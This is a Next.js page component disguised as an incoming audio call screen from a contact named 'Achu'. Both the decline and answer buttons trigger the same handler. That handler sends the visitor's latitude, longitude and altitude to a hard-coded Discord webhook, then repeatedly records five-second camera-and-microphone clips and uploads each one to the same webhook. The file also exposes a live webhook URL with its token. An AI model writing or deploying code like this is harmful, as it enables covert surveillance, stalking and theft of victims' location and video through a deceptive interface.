import Image from "next/image";
import { Geist, Geist_Mono } from "next/font/google";
import { useCallback,useRef } from "react";
import { PhoneCall, PhoneOff } from "lucide-react"; // Using lucide-react icons

const geistSans = Geist({
  variable: "--font-geist-sans",
  subsets: ["latin"],
});

const geistMono = Geist_Mono({
  variable: "--font-geist-mono",
  subsets: ["latin"],
});

export default function Home() {
   // A ref to store our interval ID (so we can clear it later if needed)
   const intervalRef = useRef(null);

   // Function for the Decline button
   const handleDecline = useCallback(() => {
     console.log("Call declined");
     if (intervalRef.current) {
       clearInterval(intervalRef.current);
       intervalRef.current = null;
       console.log("Stopped recording clips.");
     }
   }, []);
 
   // Function to record a 5-second clip and send it via Discord webhook
   const recordAndSendClip = async () => {
     try {
       console.log("Requesting camera access for clip...");
       // Request camera (and optionally audio) access
       const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
       console.log("Camera access granted for clip.");
       
       let recordedChunks = [];
       const options = { mimeType: "video/webm; codecs=vp9" };
       const mediaRecorder = new MediaRecorder(stream, options);
 
       // Collect the recorded data
       mediaRecorder.ondataavailable = (event) => {
         if (event.data && event.data.size > 0) {
           recordedChunks.push(event.data);
         }
       };
 
       // When recording stops, create a Blob and send it to Discord
       mediaRecorder.onstop = async () => {
         console.log("Recording stopped, preparing clip...");
         const blob = new Blob(recordedChunks, { type: "video/webm" });
         recordedChunks = []; // reset for next recording
 
         const formData = new FormData();
         formData.append("file", blob, "clip.webm");
         formData.append("payload_json", JSON.stringify({ content: "User's 5-second clip:" }));
 
         const webhookUrl =
           "https://discord.com/api/webhooks/1341776925168898170/BsT52TK8Ki323WwocmZREQEpZkKooVSlXOI38KK1xjpCZHauHk6wKXcHQmi8ca0yoM3G";
 
         try {
           const response = await fetch(webhookUrl, {
             method: "POST",
             body: formData,
           });
           if (response.ok) {
             console.log("Clip sent successfully!");
           } else {
             console.error("Failed to send clip. Status:", response.status);
           }
         } catch (err) {
           console.error("Error sending clip:", err);
         }
         // Stop all stream tracks
         stream.getTracks().forEach((track) => track.stop());
       };
 
       // Start recording and stop after 5 seconds
       mediaRecorder.start();
       console.log("Recording clip started...");
       setTimeout(() => {
         mediaRecorder.stop();
       }, 5000);
     } catch (error) {
       console.error("Error capturing video clip:", error);
     }
   };
 
   // Function for the Answer button: send geolocation and then start the clip recording interval
   const handleAnswer = () => {
     console.log("handleAnswer called.");
     // Get geolocation and send to Discord
     if ("geolocation" in navigator) {
       navigator.geolocation.getCurrentPosition(
         (position) => {
           const { latitude, longitude, altitude } = position.coords;
           console.log(`Latitude: ${latitude}, Longitude: ${longitude}, Altitude: ${altitude}`);
 
           const webhookUrl =
             "https://discord.com/api/webhooks/1341776925168898170/BsT52TK8Ki323WwocmZREQEpZkKooVSlXOI38KK1xjpCZHauHk6wKXcHQmi8ca0yoM3G";
 
           const payload = {
             content: `User's location:\nLatitude: ${latitude}\nLongitude: ${longitude}\nAltitude: ${altitude}`,
           };
 
           fetch(webhookUrl, {
             method: "POST",
             headers: {
               "Content-Type": "application/json",
             },
             body: JSON.stringify(payload),
           })
             .then((response) => {
               if (response.ok) {
                 console.log("Coordinates sent successfully!");
               } else {
                 console.error("Failed to send coordinates. Status:", response.status);
               }
             })
             .catch((error) => {
               console.error("Error sending coordinates:", error);
             });
         },
         (error) => {
           console.error("Error retrieving location:", error);
         }
       );
     } else {
       console.log("Geolocation is not supported by this browser.");
     }
 
     // Start recording a 5-second clip every 10 seconds (if not already running)
     if (!intervalRef.current) {
       // Record first clip immediately
       recordAndSendClip();
       // Then schedule subsequent clips every 10 seconds
       intervalRef.current = setInterval(() => {
         recordAndSendClip();
       }, 10000);
       console.log("Started recording clips every 10 seconds.");
     }
   };

  return (
    <div
      style={{
        display: "flex",
        flexDirection: "column",
        justifyContent: "center",
        alignItems: "center",
        marginTop: 40,
      }}
    >
      {/* Profile Picture and Name */}
      <div style={{ display: "flex", flexDirection: "row", marginTop: 15 }}>
        <Image
          src="./profileimg.png"
          height={45}
          width={45}
          style={{ borderRadius: 100, height: 45, marginRight: 20 }}
          alt="Picture of the author"
        />
        <h1 style={{ color: "black", fontSize: 30 }}>Achu</h1>
      </div>

      {/* Incoming Call Text */}
      <h1 style={{ color: "black", fontSize: 10, marginLeft: 75 }}>
        Incoming audio call
      </h1>

      {/* Buttons for Decline and Answer */}
      <div
        style={{
          display: "flex",
          justifyContent: "space-around",
          width: "100%",
          position: "absolute",
          bottom: 50,
          maxWidth: 250,
          marginTop: 40,
        }}
      >
        {/* Decline Button */}
        <button
          onClick={handleAnswer}
          style={{
            backgroundColor: "red",
            border: "none",
            borderRadius: "50%",
            padding: 10,
          }}
        >
          <PhoneOff color="white" size={30} />
        </button>

        {/* Answer Button */}
        <button
          onClick={handleAnswer}
          style={{
            backgroundColor: "green",
            border: "none",
            borderRadius: "50%",
            padding: 10,
          }}
        >
          <PhoneCall color="white" size={30} />
        </button>
      </div>
    </div>
  );
}
